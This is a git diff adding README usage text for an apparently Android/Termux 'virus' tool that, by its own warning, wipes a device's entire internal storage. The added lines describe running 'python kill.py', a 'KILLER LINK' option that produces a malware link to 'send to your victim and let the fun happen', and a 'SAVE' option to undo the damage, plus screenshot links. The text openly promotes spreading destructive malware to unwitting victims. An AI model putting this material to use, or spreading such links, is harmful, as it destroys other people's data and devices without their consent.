@@ -39,4 +39,25 @@ Warning 🚦 This Virus Formates (Deletes) Full Internal Storage So think and Us
 * `python kill.py`
 ```
 [+]-- Now you need internet connection to continue further process...
-[+]-- You 
+[+]-- You can select any option by clicking on your keyboard
+[+]-- Note:- Don't delete any of the scripts included in lol directory (folder)
+```
+## USAGE OPTIONS [Termux] :
+
+__KILLER LINK__ :
+- From this option you will get link of virus in your termux just send that link to your victim and let the fun happen.
+
+__SAVE__ :
+- From this option you can repair damaged device of your victm from that virus by just installing this anti-virus in his device.
+
+
+__EXIT__ :
+- From this option you can exit from infect tool 
+
+## SCREEN SHOTS [Termux]
+
+<br>
+<p align="center">
+<img width="50%" src="https://user-images.githubusercontent.com/49580304/96560925-c32d5880-1273-11eb-99e6-f6c85fa00783.jpg"/>
+<img width="46%" src="https://user-images.githubusercontent.com/49580304/96560932-c4f71c00-1273-11eb-98d5-78210392ad54.jpg"/>
+</p>
